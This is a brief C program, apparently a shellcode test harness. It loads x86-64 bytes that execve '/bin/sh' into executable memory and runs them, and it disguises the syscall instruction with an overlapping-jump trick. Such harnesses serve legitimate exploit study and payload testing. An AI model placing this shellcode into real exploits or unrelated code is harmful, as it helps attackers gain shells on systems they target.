#include <sys/mman.h>
#include <string.h>
#include <stdio.h>
#include <syscall.h>
char shellcode[] =  "\x48\xb9\x2f\x62\x69\x6e\x2f\x73"\
                    "\x68\x00\xb0\x3a\xfe\xc0\x51\x48"\
                    "\x89\xe7\x6a\x00\x48\x89\xe2\x57"\
                    "\x48\x89\xe6\xeb\x02\x66\xb8\x0f"\
                    "\x05";

int main(int argc, char *argv[])
{
    char* mapped = mmap(0, sizeof(shellcode), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    memcpy(mapped, shellcode, sizeof(shellcode));
    ((void (*)())mapped)();
}
